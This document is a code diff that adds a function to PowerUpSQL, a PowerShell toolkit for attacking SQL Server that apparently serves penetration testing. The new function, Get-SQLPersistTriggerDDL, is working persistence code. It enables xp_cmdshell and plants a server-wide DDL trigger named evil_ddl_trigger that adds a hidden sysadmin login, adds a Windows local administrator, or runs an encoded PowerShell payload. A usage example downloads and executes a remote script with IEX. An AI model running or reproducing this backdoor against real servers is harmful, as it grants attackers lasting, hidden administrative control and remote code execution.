@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.103.10
+        Version: 1.104.10
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -17595,6 +17595,458 @@ Function   Get-SQLPersistRegDebugger
         # Return message
         Write-Verbose "$Instance : Done."
     }
+}
+
+
+# ----------------------------------
+#  Get-SQLPersistTriggerDDL 
+# ----------------------------------
+# Author: Scott Sutherland
+Function Get-SQLPersistTriggerDDL
+{
+    <#
+	.SYNOPSIS
+	This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
+
+	.DESCRIPTION
+	This script can be used backdoor a Windows system using a SQL Server DDL event triggers.
+	As a result, the associated TSQL will execute when any DDL_SERVER_LEVEL_EVENTS occur.  This script supports the executing operating system 
+	and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
+	The script also support add a new sysadmin. This script can be run as the current Windows user or a 
+	SQL Server login can be provided. Note: This script requires sysadmin privileges.  The DDL_SERVER_LEVEL_EVENTS include:
+
+	CREATE DATABASE
+	ALTER DATABASE
+	DROP DATABASE
+	CREATE_ENDPOINT
+	ALTER_ENDPOINT
+	DROP_ENDPOINT
+	ADD_ROLE_MEMBER
+	DROP_ROLE_MEMBER
+	ADD_SERVER_ROLE_MEMBER
+	DROP_SERVER_ROLE_MEMBER
+	ALTER_AUTHORIZATION_SERVER
+	DENY_SERVER
+	GRANT_SERVER
+	REVOKE_SERVER
+	ALTER_LOGIN
+	CREATE_LOGIN
+	DROP_LOGIN
+	
+	Feel free to change "DDL_SERVER_LEVEL_EVENTS" to "DDL_EVENTS" if you want more coverage, but I haven't had time to test it.
+
+	.EXAMPLE
+	Create a DDL trigger to add a new sysadmin.  The example shows the script being run using a SQL Login.
+
+	PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
+
+	.EXAMPLE
+	Create a DDL trigger to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
+	being run as the current windows user.
+
+	PS C:\> Get-SQLPersistTriggerDDL -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
+
+	.EXAMPLE
+	Create a DDL trigger to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
+	from the internet and executes it.  The example shows the script being run as the current Windows user.
+
+	PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
+	
+	.EXAMPLE
+	Remove evil_DDL_trigger as the current Windows user.
+
+	PS C:\> Get-SQLPersistTriggerDDL -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove
+
+	.LINK
+	http://www.netspi.com
+	https://technet.microsoft.com/en-us/library/ms186582(v=sql.90).aspx
+
+	.NOTES
+	Author: Scott Sutherland - 2016, NetSPI
+    #>
+
+  [CmdletBinding()]
+  Param(
+    
+    [Parameter(Mandatory = $false,
+    HelpMessage = 'Username to authenticate with.')]
+    [string]$Username,
+
+    [Parameter(Mandatory = $false,
+    HelpMessage = 'Password to authenticate with.')]
+    [string]$Password,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set username for new SQL Server sysadmin login.')]
+    [string]$NewSqlUser,
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set password for new SQL Server sysadmin login.')]
+    [string]$NewSqlPass,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set username for new Windows local administrator account.')]
+    [string]$NewOsUser,
+    
+    [Parameter(Mandatory=$false,
+    HelpMessage='Set password for new Windows local administrator account.')]
+    [string]$NewOsPass,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='Create trigger that will run the provide PowerShell command.')]
+    [string]$PsCommand,
+
+    [Parameter(Mandatory = $false,
+    ValueFromPipelineByPropertyName = $true,
+    HelpMessage = 'SQL Server instance to connection to.')]
+    [string]$Instance,
+
+    [Parameter(Mandatory=$false,
+    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
+    [Switch]$Remove
+  )
+
+    # -----------------------------------------------
+    # Setup database connection string
+    # -----------------------------------------------
+    
+    # Create fun connection object
+    $conn = New-Object System.Data.SqlClient.SqlConnection
+    
+    # Set authentication type and create connection string
+    if($Username){
+    
+        # SQL login / alternative domain credentials
+        Write-Verbose "$Instance : Attempting to authenticate to $Instance with SQL login $Username..."
+        $conn.ConnectionString = "Server=$Instance;Database=master;User ID=$Username;Password=$Password;"
+        [string]$ConnectUser = $Username
+    }else{
+            
+        # Trusted connection
+        Write-Verbose "$Instance : Attempting to authenticate to $Instance as the current Windows user..."
+        $conn.ConnectionString = "Server=$Instance;Database=master;Integrated Security=SSPI;"   
+        $UserDomain = [Environment]::UserDomainName
+        $DUsername = [Environment]::UserName
+        $ConnectUser = "$UserDomain\$DUsername"                    
+     }
+
+
+    # -------------------------------------------------------
+    # Test database connection
+    # -------------------------------------------------------
+
+    try{
+        $conn.Open()
+        Write-Verbose "$Instance : Connected." 
+        $conn.Close()
+    }catch{
+        $ErrorMessage = $_.Exception.Message
+        Write-Verbose "$Instance : Connection failed" 
+        Write-Verbose "$Instance : Error: $ErrorMessage"  
+        Break
+    }
+
+
+    # -------------------------------------------------------
+    # Check if the user is a sysadmin
+    # -------------------------------------------------------
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query
+    $Query = "select is_srvrolemember('sysadmin') as sysstatus"
+
+    # Execute query
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableIsSysAdmin = New-Object System.Data.DataTable
+    $TableIsSysAdmin.Load($results)  
+
+    # Check if current user is a sysadmin
+    $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {
+
+        $Checksysadmin = $_.sysstatus
+        if ($Checksysadmin -ne 0){
+            Write-Verbose "$Instance : Confirmed Sysadmin access."                             
+        }else{
+            Write-Verbose "$Instance : The current user does not have sysadmin privileges." 
+            Write-Verbose "$Instance : Sysadmin privileges are required." 
+            Break
+        }
+    }
+
+    # Close db connection
+    $conn.Close()
+
+    # -------------------------------------------------------
+    # Enabled Show Advanced Options - needed for xp_cmdshell
+    # ------------------------------------------------------- 
+    
+    # Status user
+    Write-Verbose "$Instance : Enabling 'Show Advanced Options', if required..."
+    
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "IF (select value_in_use from sys.configurations where name = 'Show Advanced Options') = 0
+    EXEC ('sp_configure ''Show Advanced Options'',1;RECONFIGURE')"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+        
+    # Close db connection
+    $conn.Close()    
+    
+
+    # -------------------------------------------------------
+    # Enabled xp_cmdshell - needed for os commands
+    # -------------------------------------------------------
+
+    Write-Verbose "$Instance : Enabling 'xp_cmdshell', if required..."  
+    
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "IF (select value_in_use from sys.configurations where name = 'xp_cmdshell') = 0
+    EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE')"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+        
+    # Close db connection
+    $conn.Close()  
+
+
+    # -------------------------------------------------------
+    # Check if the service account is local admin
+    # -------------------------------------------------------
+    
+    Write-Verbose "$Instance : Checking if service account is a local administrator..."  
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = @"
+
+                        -- Setup reg path 
+                        DECLARE @SQLServerInstance varchar(250)  
+                        if @@SERVICENAME = 'MSSQLSERVER'
+                        BEGIN											
+                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
+                        END						
+                        ELSE
+                        BEGIN
+                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
+                        END
+
+                        -- Grab service account from service's reg path
+                        DECLARE @ServiceaccountName varchar(250)  
+                        EXECUTE master.dbo.xp_instance_regread  
+                        N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
+                        N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' 
+
+                        DECLARE @MachineType  SYSNAME
+                        EXECUTE master.dbo.xp_regread
+                        @rootkey      = N'HKEY_LOCAL_MACHINE',
+                        @key          = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
+                        @value_name   = N'ProductType', 
+                        @value        = @MachineType output
+                        
+                        -- Grab more info about the server
+                        SELECT @ServiceAccountName as SvcAcct
+"@
+
+    # Execute query
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableServiceAccount = New-Object System.Data.DataTable
+    $TableServiceAccount.Load($results)  
+    $SqlServeServiceAccountDirty = $TableServiceAccount | select SvcAcct -ExpandProperty SvcAcct 
+    $SqlServeServiceAccount = $SqlServeServiceAccountDirty -replace '\.\\',''
+        
+    # Close db connection
+    $conn.Close() 
+
+    # Open db connection
+    $conn.Open()
+
+    # Setup query 
+    $Query = "EXEC master..xp_cmdshell 'net localgroup Administrators';"
+
+    # Execute query 
+    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+    $results = $cmd.ExecuteReader() 
+
+    # Parse query results
+    $TableServiceAccountPriv = New-Object System.Data.DataTable
+    $TableServiceAccountPriv.Load($results)  
+        
+    # Close db connection
+    $conn.Close()  
+
+    if($SqlServeServiceAccount -eq "LocalSystem" -or $TableServiceAccountPriv -contains "$SqlServeServiceAccount"){
+        Write-Verbose "$Instance : The service account $SqlServeServiceAccount has local administrator privileges."  
+        $SvcAdmin = 1
+    }else{
+        Write-Verbose "$Instance : The service account $SqlServeServiceAccount does NOT have local administrator privileges." 
+        $SvcAdmin = 0 
+    }
+
+    # -------------------
+    # Setup the pscommand
+    # -------------------
+    $Query_PsCommand = ""
+     if($PsCommand){
+
+        # Status user
+        Write-Verbose "$Instance : Creating encoding PowerShell payload..." 
+        
+        # Check for local administrator privs 
+        if($SvcAdmin -eq 0){
+            Write-Verbose "$Instance : Note: PowerShell won't be able to take administrative actions due to the service account configuration." 
+        }
+
+        # This encoding method was based on a function by Carlos Perez 
+        # https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/PostExploitation/PostExploitation.psm1
+
+        # Encode PowerShell command
+        $CmdBytes = [Text.Encoding]::Unicode.GetBytes($PsCommand)
+        $EncodedCommand = [Convert]::ToBase64String($CmdBytes)
+
+        # Check if PowerShell command is too long
+        If ($EncodedCommand.Length -gt 8100)
+        {
+            Write-Verbose "PowerShell encoded payload is too long so the PowerShell command will not be added." 
+        }else{
+
+            # Create query
+            $Query_PsCommand = "EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand'';" 
+
+            Write-Verbose "$Instance : Payload generated." 
+        }
+    }else{
+        Write-Verbose "$Instance : Note: No PowerShell will be executed, because the parameters weren't provided." 
+    }
+
+    # -------------------
+    # Setup newosuser
+    # -------------------
+    $Query_OsAddUser = ""
+    if($NewOsUser){
+
+        # Status user
+        Write-Verbose "$Instance : Creating payload to add OS user..." 
+
+        # Check for local administrator privs 
+        if($SvcAdmin -eq 0){
+
+            # Status user
+            Write-Verbose "$Instance : The service account does not have local administrator privileges so no OS admin can be created.  Aborted."
+            Break
+        }else{
+
+            # Create query
+            $Query_OsAddUser = "EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser'';"
+
+            # Status user
+            Write-Verbose "$Instance : Payload generated." 
+        }
+    }else{
+        Write-Verbose "$Instance : Note: No OS admin will be created, because the parameters weren't provided." 
+    }
+    
+    # -----------------------
+    # Setup add sysadmin user
+    # -----------------------
+    $Query_SysAdmin = ""
+    if($NewSqlUser){
+
+        # Status user
+        Write-Verbose "$Instance : Generating payload to add sysadmin..." 
+        
+        # Create query
+        $Query_SysAdmin = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''$NewSqlUser'')
+        exec(''CREATE LOGIN $NewSqlUser WITH PASSWORD = ''''$NewSqlPass'''';EXEC sp_addsrvrolemember ''''$NewSqlUser'''', ''''sysadmin'''';'')"
+
+        # Status user
+        Write-Verbose "$Instance : Payload generated." 
+    }else{
+        Write-Verbose "$Instance : Note: No sysadmin will be created, because the parameters weren't provided." 
+    }
+
+    # -------------------------------------------------------
+    # Create DDL trigger 
+    # -------------------------------------------------------
+    if(($NewSqlUser) -or ($NewOsUser) -or ($PsCommand)){
+        # Status user
+        Write-Verbose "$Instance : Creating trigger..." 
+
+        # ---------------------------
+        # Create procedure
+        # ---------------------------
+
+        # Open db connection
+        $conn.Open()
+
+        # Setup query 
+        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
+        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
+        exec('CREATE Trigger [evil_ddl_trigger] 
+        on ALL Server
+        For DDL_SERVER_LEVEL_EVENTS
+        AS
+        $Query_OsAddUser $Query_SysAdmin $Query_PsCommand')"
+
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader() 
+        
+        # Close db connection
+        $conn.Close()
+
+         Write-Verbose "$Instance : The evil_ddl_trigger trigger has been added. It will run with any DDL event." 
+    }else{
+        Write-Verbose "$Instance : No options were provided." 
+    }
+
+    # -------------------------------------------------------
+    # REmove DDL trigger 
+    # -------------------------------------------------------
+    if($Remove){
+
+        # Status user
+        Write-Verbose "$Instance : Removing trigger named evil_DDL_trigger..." 
+
+        # ---------------------------
+        # Create procedure
+        # ---------------------------
+
+        # Open db connection
+        $conn.Open()
+
+        # Setup query 
+        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
+        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER"
+
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+        $results = $cmd.ExecuteReader() 
+        
+        # Close db connection
+        $conn.Close()
+
+        Write-Verbose "$Instance : The evil_ddl_trigger trigger has been been removed." 
+    }
+
+    Write-Verbose "$Instance : All done."
 }
 #endregion
 
